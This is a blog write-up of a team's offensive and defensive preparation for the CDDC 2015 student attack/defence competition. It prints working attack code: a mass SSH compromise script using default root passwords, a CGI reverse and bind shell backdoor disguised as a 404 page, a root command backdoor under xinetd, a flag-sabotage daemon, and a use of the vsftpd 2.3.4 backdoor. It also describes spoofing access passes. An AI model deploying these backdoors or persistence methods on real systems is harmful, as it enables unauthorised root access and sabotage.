## Introduction

The [Cyber Defenders Discovery Camp 2015](https://www.dsta.gov.sg/cddc) is an
introductory computer security workshop slash competition targeted at students
at the JC and IHL levels. There are two days of training in which a condensed
form of [OSSA by ThinkSECURE](http://securitystartshere.org/page-training-ossa.htm)
is delivered to the participants which aims to cover the basics of what is
required to compete on the third day.

It has been a great pleasure of mine to have been given the opportunity to
participate in my second CDDC (I won in 2012) with the [NUS Greyhats](http://nusgreyhats.org/)
this year. I salute their passion and the experience even though things went
horribly for us (will elaborate later) and I look forward to being a part of the
group as it grows. We have put in an immense amount of effort together.

The format of the competition is unique. There are two objectives:

1. Attack and Defend a Linux firewall and Linux server that was provided during
   the training days. The server plays host to a number of very vulnerable
   services.
2. Penetrate your way into the Scenario Network run by the Gamemasters and solve
   side challenges.

If you are familiar with the competitions run by ThinkSECURE such as AIRRAID,
objective 2 is their trademark. So the decision to include an attack/defence
portion is an interesting addition. Unfortunately, the time limit is
ridiculously short (5 hours) to fully appreciate the intricacies of the scenario
network in addition to playing defence.

This blog post will discuss, in full disclosure style, the preparations we
performed, the scripts we wrote, the things we did, the shenanigans we pulled,
and ultimately the really cool things that we've learnt. However, on the flip
side, I believe that CDDC 2012 was a much smoother event. I am [quite familiar
with CTFs](https://ctftime.org/team/10339) and have a few reservations about
this year's edition (with regards to the ridiculously short time allocated for
the Gamemasters by the organisers to run the gameplay, as well as the poor floor
network support displayed by the hardware and network vendor). I will discuss
the shortcomings of this competition, and provide some suggestions for
improvement in a separate article.

## Preparation

A stitch in time saves nine. Right?

### Training Days

Being more or less well versed with the contents of the training (most of us
hold the OSSA certification), one might think that it was a waste of time for
us. One could not be more wrong. The training days were a great opportunity to
learn more about both about our fellow competitors as well as the elements of
the competition. The trick is to keep your eyes, ears, and mind open. Always be
on the lookout for holes.

### Competition Elements

From the way the hardware was set up, it was obvious that the competition would
leverage on the same infrastructure as the workshop. Now, two virtual machines
running Fedora were provided for the workshop on the server machine. One is
dual-homed and acts as the firewall, and the other sits behind the firewall and
runs services.

Since the effort required to set up the virtual machines PER TEAM is quite
astronomical (there were 57 IHL teams), we predicted that the virtual
machines would be reused for the attack/defence portion of the competition (we
were correct). Now, what would an intelligent agent do with this prediction?
Copy out the virtual machines to a thumb drive for analysis at home, of course
ðŸ™‚

Now, that isnâ€™t the only thing that can be done. The implication of virtual
machine re-use means that there is the very large possibility that students
might screw up their machines during the workshop. Thus, there is also an
equally large possibility that the organisers are aware of this and will give
the instruction to revert their images (this didnâ€™t happen though).

However, we are also banking on the fact that people who know what they are
doing as a sysadmin would probably take the opportunity to harden their systems
and NOT revert their images to prevent losing progress. This in addition to
another prediction we had made the previous night: that the username and
passwords will be set defaults instead of being team-specific (unlike in HitB),
prompted us to write scripts to automate the planting of backdoors in every
server of every team. The following is a listing of the python script we used to
very quickly own every teamâ€™s machine.

```python
from pwn import *
from Queue import Queue
from threading import Thread
import socket

USERNAME = "root"
PASSWORD = "password"
hosts = file("hosts").read().split("\n")

def do_stuff(q):
      while True:
        host = q.get()
        pwn(host)
        q.task_done()

def pwn(host):
    if host == "":
        return
    try:
        socket.inet_aton(host)
    except:
        return
    try:
        s = ssh(USERNAME, host, password=PASSWORD)
        s.upload_file("./pwnscript", remote="/tmp/cache")
        s.upload_file("./freeshell.py", remote="/tmp/fs.py")
        s.run_to_end("echo '%s' | sudo sh /tmp/cache" % PASSWORD)

        log.success("%s Owned" % host)
    except:
        log.error("%s failed" % host)

q = Queue(maxsize=0)
num_threads = 10

for i in range(num_threads):
    worker = Thread(target=do_stuff, args=(q,))
    worker.setDaemon(True)
    worker.start()

for i in hosts:
    q.put(i)

q.join()
```

### Server Image Analysis

Obviously, we cannot rely on our backdoors persisting through the competition
and we are required to harden our own systems as well so a deep analysis on the
system is key. First, we set up the machine on Virtualbox with the VMWare disk
attached and edit the interface settings so that we can access it on a local
network. We configure the machine to use DHCP.

```shell
[root@student-svr ~]# cat /etc/sysconfig/network-scripts/ifcfg-eth1
DEVICE=eth1
BOOTPROTO=dhcp
ONBOOT=yes
```

Now, we examine the list of processes that listen on both TCP and UDP ports.

```shell
[root@student-svr ~]# netstat -tunap
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name
tcp        0      0 0.0.0.0:587                 0.0.0.0:*                   LISTEN      1412/sendmail: acce
tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      1456/lighttpd
tcp        0      0 0.0.0.0:8080                0.0.0.0:*                   LISTEN      1439/httpd
tcp        0      0 0.0.0.0:465                 0.0.0.0:*                   LISTEN      1412/sendmail: acce
tcp        0      0 0.0.0.0:21                  0.0.0.0:*                   LISTEN      1389/xinetd
tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      1379/sshd
tcp        0      0 0.0.0.0:25                  0.0.0.0:*                   LISTEN      1412/sendmail: acce
tcp        0      0 0.0.0.0:8443                0.0.0.0:*                   LISTEN      1439/httpd
tcp        0    960 192.168.1.57:22             192.168.1.46:51102          ESTABLISHED 1713/0
udp        0      0 0.0.0.0:68                  0.0.0.0:*                               1623/dhclient
```

We can see that the following services are running and actively listening for
connections:

1. xinetd on tcp port 21
2. sshd on tcp port 22
3. sendmail on tcp ports 25, 465, and 587
4. lighttpd on tcp port 80
5. httpd on tcp ports 8080 and 8443
6. dhclient on udp port 68

While all of these services are exploitable in one way or the other, the one
that catches our eye is the xinetd one. Port 21 is FTP and xinetd will probably
launch the FTP service on connection. Let us check:

```shell
[root@student-svr ~]# nc localhost 21
220-
220-               *** OUR FTP SERVER ***
220-
220-    You are user %N out of a maximum of %M authorized anonymous logins.
220-    The current time here is %T.
220-    If you experience any problems here, contact : %E
220-
220-
220
```

And we are correct. Checking the xinetd configuration:


```shell
[root@student-svr ~]# cat /etc/xinetd.d/vsftpd
# default: on
# description:
#   The vsftpd FTP server serves FTP connections. It uses
#   normal, unencrypted usernames and passwords for authentication.
# vsftpd is designed to be secure.
service ftp
{
        socket_type             = stream
        wait                    = no
        user                    = root
        server                  = /usr/local/sbin/vsftpd
#       server_args             =
#       log_on_success          += DURATION USERID
#       log_on_failure          += USERID
        nice                    = 10
        disable                 = no
}

[root@student-svr ~]# cat /etc/xinetd.d/xproftpd
# default: off
# description: The ProFTPD FTP server serves FTP connections. It uses \
#    normal, unencrypted usernames and passwords for authentication.
service ftp
{
    socket_type        = stream
    wait            = no
    user            = root
    server            = /usr/sbin/in.proftpd
    log_on_success        += DURATION USERID
    log_on_failure        += USERID
    nice            = 10
    disable            = yes
}
```

Looks like the server runs vsftpd by default. Let's check what version it is
running.

```shell
[root@student-svr ~]# /usr/local/sbin/vsftpd -v
vsftpd: version 2.3.4
```

![That's a bingo!]({{ site.url }}{{ site.baseurl }}/assets/images/cddc2015/bingo.gif){: .align-center}

vsftpd 2.3.4 has a backdoor inserted into it ðŸ™‚ If you read the [description of
the backdoor](https://xorl.wordpress.com/2011/07/05/vsftpd-2-3-4-backdoor/),
you can see how it triggers. Basically, if you send a string containing a smiley
face (such as when you are providing a USER), a listening shell will be started
on port 6200. To verify that this is indeed true, we can launch the exploit
manually over netcat:

```shell
amon@Evanna:~/ctf2015/cddc$ nc 192.168.1.57 21
220-
220-               *** OUR FTP SERVER ***
220-
220-    You are user %N out of a maximum of %M authorized anonymous logins.
220-    The current time here is %T.
220-    If you experience any problems here, contact : %E
220-

sys
tmp
usr
var
id
uid=0(root) gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

It even has root permissions since obviously, xinetd has been configured to use
the root user for vsftpd. Now, this is easily fixable. Since we want to ensure
that the FTP behaviour is exactly as how the Gamemasters expect it to be during
the competition, we simply patched the binary by removing the shell spawning and
string compare triggers.

<small>*Using Hopper to NOP out the offending bytes*</small>
{: .text-center}

Now after a bit of searching around, we discovered that there are two files that
are required to be exact and unchanged to maintain a level of service
availability. They were:

```shell
[root@student-svr ~]# cat /home/public/file
The contents of this file is not to be changed or deleted.
[root@student-svr ~]# cat /srv/www/htdocs/index.html
<html>
<head>
</head>
<body>
<br>
<br><ul>
<font size=5px face="tahoma"><b>Welcome To Our Web Server</b></font>
<br>
<br>
This page should not be modified in any way (not even a<br>
space or fullstop should be added!) and should<br>
remain accessible by anyone visiting this service.
<br>
<br>
Any outage to this service or modification or removal of<br>
this web page will constitute a loss of availability on the<br>
part of the person(s) running this service.
<br><br>
</ul>
</body>
</html>
```

We inferred that the SSH, FTP, and Web access has to be untampered with.

This is only the tip of the iceberg for what we've discovered in our analysis of
the system. We'll leave that as an exercise to the reader to discover more :)
For a description of how we leveraged our knowledge of the system, please take a
look at the SleekPwn section later in this article.

### Other Competitors

Now, we were also able to very accurately pin point which IP address maps to
which team as well. How, you might ask? Reconnaissance, of course :) Also, teams
are given a number and your virtual machines are mapped to: 172.25.0.X for the
firewall, and 172.26.X.1 for the server where X is the team number.

![Map of teams]({{ site.url }}{{ site.baseurl }}/assets/images/cddc2015/tables.jpg){: .align-center}
<small>*Map of teams*</small>
{: .text-center}

Of course, we aren't restricted to the technical aspects of security. There is
always the operational aspect of it. We searched the social networking websites
for mentions of #CDDC and found quite a few names to match to the teams. We even
found an aspiring photographer on an SP team :/ Taking pictures of your pass
isn't a very good idea anywhere.

## Prepared Attacks

### Access Pass Spoofing

From there, we came up with a plan to deny some teams access to their starting
packs. We designed a method to spoof the access passes that allows for very
quick and easy replacement of names. Here are a few images detailing the
process:

<small>*Examples of the finished product*</small>
{: .text-center}

All we needed to do was ensure that we queue up before our target teams and
collect their starter packs :) Do note that the Gamemasters did anticipate such
a ruse happening (it is a free fire zone, after all) and prepared back ups.

Shown here is some of our loot:

## SleekPwn

My baby of the competition is called SleekPwn. I have open sourced it and it is
accessible at [my github repo](https://github.com/nnamon/sleekpwn). It is a
system that was designed to automatically engage and compromise opponent
servers, and monitor for the indicators of compromise and sabotage. The attack
model is heavily specific to this competition and is designed to be robust and
intelligent. This is because recovering from a compromise is very easy: one may
just simply revert the image. Hence, it has to have automated detection and
re-compromise logic included as well.

As a summary:

### What it is

- Written in Python, leveraging on a few libraries:
  - pwntools, for easier SSH handling and beautiful logging
  - bottle, to run the web monitor interface
  - peewee, to provide the ORM on top of a SQLite database
  - requests, for better web networking
  - jquery, for the javascript web bits
- Payloads are written in:
  - Shell Script
  - Python
  - C
- Is multi-threaded and handles scale very well
  - Is fault tolerant and very robust
- Fire-and-Forget
  - There is no requirement for any intervention during the runtime
  - Will compromise targets automatically
  - Will monitor for reverts and automatically re-compromise
- Maintains Persistence
  - Multiple avenues of persistence to regain entry
  - Extremely robust embedding
- Maintains Un-Integrity of Flags
  - Corrupts the publicly accessible flags on detection that the flags have been recovered.
  - Leverages extended file attributes to make it difficult for defenders to defeat
  - Process respawns automatically on kill
- Patches the Target System
  - Fixes the vulnerabilities on a compromised system after persistence has been maintained
- Written over 2 days
  - The source code is open source. Look here: [https://github.com/nnamon/sleekpwn](https://github.com/nnamon/sleekpwn)

### What it is not

- Not a script kiddie tool
  - This is a very domain specific system tailored for this competition
- Not easy to set up
  - I had to patch pwntools at a few places to fix debilitating bugs caused by
    that library
  - Generation of the target configuration might require writing your own
    scripts
  - Heavy editing of the source code is required to adapt this to your needs
  - You need to generate your own keys

### Exploitation

SleekPwn attempts to compromise a system in three tiers:

1. vsftpd 2.3.4 backdoor
2. planted ssh keys (during the training)
3. default root passwords

If anyone of these access methods are successful, SleekPwn will immediately
deliver the first stage payload which overwrites `/root/.ssh/authorized_keys`
with our public key in addition to the Gamemasterâ€™s keys.

```shell
[root@student-svr ~]# cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvwm+v3g/s0lLXRcoPH/3a7++lYWoEtq/11yZ6gOLVnFgDOzhQEpufwTqTNetzEw7BCeotpz8ZiG+fGAWvIdmGfErDzi6tuZWWj4uOh20T/sjimf40TGpggmCsfuNSm1AX0s0tXSYOIqPT1gR1fz71k4U/UeZhTiEmFQxG3aSu5SRrnWIJNjYRJm/Rd/JYPamq62loBM/oG4j8of62hbev2ua9jgL/E6GJ06YUto+ZpSG3ZMpzom6uVWYVC+ilneCHvMvMv0t7fdrM8I2SNtkHdGrUQOKKqaX3qlD6l3NMsnCk8gYDxP9H94/kW3YQH0FYuU+o8zC5LS+a4BIKOIgcw== root@bt

```

It then overwrites `/etc/ssh/sshd_config` to allow root connections and restarts
the ssh server. From then on, it connects using SSH to prevent sniffing of
traffic. It uploads the second stage payload which handles the extra
persistence, sabotage, and patching functionality.

If these fail, it will try to check if their vsftpd 2.3.4 is the patch binary
version we replace in the egress stage (see the Patching section).

### Persistence

SleekPwn maintains its persistence on a target machine in four ways:

#### 1. SSH keys

Installing our public key in `/root/.ssh/authorized_keys` and setting that file
to be immutable.

#### 2. CGI Shells

Creating a new CGI directory in the `/etc/httpd/conf/httpd.conf` configurations
that map `/cgi/` to `/usr/lib/yum-plugins/`, and uploading a special python CGI
script to `/usr/lib/yum-plugins/.gh`. The CGI script:

```python
#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import cgi

import socket
import md5
import os
import subprocess

notfound = """
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /cgi/.gh was not found on this server.</p>
<hr>
</body></html>
"""

print "Content-type:text/html\r\n\r\n"
print notfound

form = cgi.FieldStorage()
if "r" not in form:
    exit()
r = int(form["r"].value.strip())
if "cb" not in form:
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serversocket.bind(("0.0.0.0", r))
    serversocket.listen(5)

    (clientsocket, address) = serversocket.accept()
else:
    cb = form["cb"].value
    clientsocket = socket.socket()
    clientsocket.connect((cb, r))

clientsocket.sendall("Breakfast Club?")
data = clientsocket.recv(20)
if md5.md5(data.strip()).hexdigest() == "f8b882394d662869d6f550d9112ce82e":
    clientsocket.sendall("Judd Nelson?")
    os.dup2(clientsocket.fileno(), 0)
    os.dup2(clientsocket.fileno(), 1)
    os.dup2(clientsocket.fileno(), 2)
    p=subprocess.call(["/bin/sh","-i"])
```

It masquerades as a HTTP 404 error but is actually able to create listener
shells or trigger connect back shells. The script accepts two parameters: cb and
r. 'r' refers to the port. This parameter is required. 'cb' is the callback
address. This is optional. If 'cb' is supplied, the remote machine will connect
to the local machine at the port. The interesting thing about the backdoor is,
it requires a password so an enterprising system admin who has spotted the
script can't simply start spawning shells of his own.

Demo of Listener Shell:

#### Setuid Binaries

Uploading a setuid binary wrapper around a shell to escalate a user to root.
This means we could have logged in as public even if all other backdoors were
removed and still have escalated to root. This was demonstrated in the CGI
backdoor in the previous point. Here is a demo of it in action when accessing
the target server with the default public:password credentials (which is
required for defence points).

```shell
amon@Evanna:~/ctf2015/cddc/sleekpwn$ ssh public@192.168.1.57
public@192.168.1.57's password:
Last login: Thu Jun 18 13:37:51 2015 from 192.168.1.46

#### Custom xinetd Service

Configured xinetd to listen on 6660 and run the special python script called pyx
that authenticates a password. This service facilitates mass control of all the
targets.

Custom xinetd service:

```shell
[root@student-svr ~]# cat /etc/xinetd.d/pyx
service pyx
{
        socket_type             = stream
        wait                    = no
        user                    = root
        server                  = /usr/sbin/pyx
#       server_args             =
#       log_on_success          += DURATION USERID
#       log_on_failure          += USERID
        nice                    = 10
        disable                 = no
        port                    = 6660
}
```

Custom python listener:

```python
#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import sys
import md5
import os

sys.stdout.write('.')
sys.stdout.flush()
data = sys.stdin.readline().strip()
try:
    auth, cmd = data.split(":::")
    if md5.md5(auth).hexdigest() == "b41135d9bda51105855aeeb3c4aa7e5a":
        os.system(cmd)
except:
    pass
```

Additionally, we have a tool that uses multi-threading to send commands to a
very large list of hosts using this backdoor.

```shell
amon@Evanna:~/ctf2015/cddc/sleekpwn/dev/badbitches$ cat catstorm | python massbitches.py demohosts
Working on 192.168.1.57
Working on 192.168.1.60
192.168.1.57: cmd sent successfully
192.168.1.60: cmd failed to send
```

### Sabotage

We also hid this daemon as an existing service. We wonâ€™t elaborate on our
techniques as itâ€™s a pretty cool stealthy solution. Do a little more â€˜Ask the
Oracleâ€™ ðŸ™‚

```c
// Monitor flags for correction. Then rectify that.
// by amon (amon@nandynarwhals.org)

#include <stdlib.h>
#include <unistd.h>

int main() {
    while (1) {
        system("chattr -i /srv/www/htdocs/index.html");
        system("cat /srv/www/htdocs/index.html | md5sum | grep fa477c36d6c52d52bbd9b6af7df708fa && sed -i 's/service\\./service. /g' /srv/www/htdocs/index.html");
        system("chattr +i /srv/www/htdocs/index.html");
        system("chattr -i /var/ftp/welcome.msg");
        system("cat /var/ftp/welcome.msg | md5sum | grep df35704116608a3ed56f6710fe7e3b07 && sed -i 's/,//g' /var/ftp/welcome.msg");
        system("chattr +i /var/ftp/welcome.msg");
        system("chattr -i /home/public/file");
        system("cat /home/public/file | md5sum | grep 4d91498a12508cd7f51fe6d5265ee521 && sed -i 's/ts/t/g' /home/public/file");
        system("chattr +i /home/public/file");
        sleep(2);
    }
}
```

### Patching

After we are done installing our backdoors and our unintegrity daemon, we want
to leave the system to its own devices. We also don't want anyone else coming in
and `rm -rf /`-ing the whole server because there is beauty and craft in
subtlety. Basically, there are three issues that need immediate fixing:

1. vsftpd 2.3.4 backdoor
2. Default passwords for root and logging in over ssh
3. Default passwords for root and accessing FTP

Now, this is a little tricky because two of the three issues are solved by
changing the default root password but we do not want to alert the team to the
fact that their system has been compromised by changing their root passwords for
them. Let's deal with the vsftpd 2.3.4 backdoor first.

Our solution was extremely simple. I patched the binary to look for the
character sequence 'D8' instead of ':)' and replaced their original binary with
mine.

<small>*Patching out the smiley*</small>
{: .text-center}

The other two issues we solved by modifying the corresponding service
configuration files and essentially hardened the settings.

We can disallow root logins over FTP by enforcing a userlist file to be used by
setting `userlist_enable` and `userlist_file` in `/etc/vsftpd.conf`.

```shell
printf "\nuserlist_enable=YES\nuserlist_file=/etc/ftpusers\n" >> /etc/vsftpd.conf
```

We can also disallow root logins using passwords over SSH by specifying the
option PermitRootLogin without-password.

```shell
sed -i 's/#PermitRootLogin yes/PermitRootLogin without-password/g' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin yes/PermitRootLogin without-password/g' /etc/ssh/sshd_config
service sshd restart
```

### In Action

We have a screen capture of SleekPwn running a replay of the first hour of the
competition. Unfortunately, SleekPwn stopped working towards the end of the
first hour after the IHL network (provided by the hardware and network vendor
that set up the floor cabling) displayed severe connectivity issues, preventing
anyone in the IHL section to access the Gamemasters' gameplay network. There was
simply no way for us to reach anything in the gameplay network through the wired
cabling and switches at the IHL tables since all traffic has to go through the
faulty vendor supplied hardware.

Now, we can confirm that the gameplay network was not disrupted as the JC teams,
who were probably directly cabled to the Gamemasters' switches instead of
through the IHL network, did not complain of any network outage or connectivity
problems. This was further confirmed as after the left most IHL column was
directly patched to the Gamemasters' switch and regained connectivity. (We
actually confirmed this for ourselves after the competition by plugging our
SleekPwn machine to that row and instantly regained contact with our compromised
machines.)

Connectivity issues aside, let us get back to the video. In the video, what you
can observe is that the hosts change colours based on their statuses. Blue hosts
have been compromised while black hosts are uncompromised. At that point, the
black hosts are unreachable. That is, their servers were not up at all. SleekPwn
ran without problems for a glorious hour until the IHL network went FUBAR.
Unfortunately, no corrective effort was made on the part of the hardware and
network vendors so connectivity was never regained for the rest of the columns.

## Competition Day

Unfortunately, during the majority of the five hours of competition, our team
was bogged down with debugging the network issues which ultimately turned out to
be a hardware misconfiguration that affected everybody in the IHL group. As
such, although we did solve a a lot of side challenges that do not rely on the
main network, it was hardly enough. Our attempts at making progress just drove
us further down into the ground as we focused on a very active playstyle where
we expected to use the information we sacrificed our initial starting points
for.

Instead, we were met with a very dead network (very bad monitoring of network
health on the part of the hardware vendors supplying the student side of the
network) and could do nothing but waste good time until the WiFi trade-ins were
open at 12pm. The Wi-Fi network that connected straight to the Gamemasters had
no such problems. It was truly a pity. About 80% of teams machines compromised,
and unable to take advantage of that. (Incidentally, we were heartbroken that
one of the side challenges we found through WiFi required us to demonstrate we
had root access on Team 7. Which we did. But perhaps it was our fault that we
didn't seek to demonstrate it physically instead of banging our heads on the non
responsive network)

As it were, it was no surprise the team that was the most passive took the grand
prize while teams that actively sought solutions to their dilemma, taking risks
and slogging through the mismanaged situation, and basically prepared for
anything but the most ridiculously stacked odds on the part of the lack of
timely network fault detection and remediation processes by the floor
hardware providers.

Truly, a team can achieve the Best of Defence if there is no opposing Offence to
speak of. An absent Offence that actually bled a number of teams dry just from
running in that first hour.

I shall not elaborate any further. All further exposition will be carried on
in this post where I will also perform a review of the situation and provide
constructive feedback.

There will be no analysis of the scenario-based network.

## Conclusions

While we have been met with extreme disappointment in the light of all our
effort into preparing for the competition, not all is lost. In the preparation
step, we have learnt to work as a team toward achieving an admirable goal and I
must say we have taken huge steps to achieving it. Personally, I've learnt a lot
just by dissecting the vulnerable server, crafting all sorts of attacks against
it, and figuring out the defences against my own attacks and I'm glad that I can
open source my work and write about it so that others may still learn.
Seriously, it was a lot of fun when everything went according to plan for that
one hour, with the pass spoofing shenanigans, mass exploitation, and document
parsing assembly lines. And well...

I guess that sometimes the heroes have to be blind, deaf, and stumbling. Because
apt metaphors are apt.
